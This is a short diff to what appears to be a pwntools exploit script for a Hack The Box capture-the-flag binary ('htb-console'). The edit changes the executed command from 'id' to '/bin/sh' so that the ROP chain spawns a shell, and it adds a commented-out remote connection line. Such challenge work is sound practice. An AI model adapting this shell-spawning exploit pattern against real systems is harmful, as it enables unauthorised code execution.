@@ -4,7 +4,7 @@ context(os='linux', arch='amd64')
 
 executable = '/home/kali/Downloads/htb-console'
 padding_length = 24
-command = 'id'
+command = '/bin/sh'
 
 #################################################
 # Create ROP Chain
@@ -32,6 +32,7 @@ payload = b"".join(payload)
 # Run Process
 
 io = elf.process()
+#io = remote('', )
 
 log.info('add command to memory')
 io.sendlineafter('>>', 'hof')
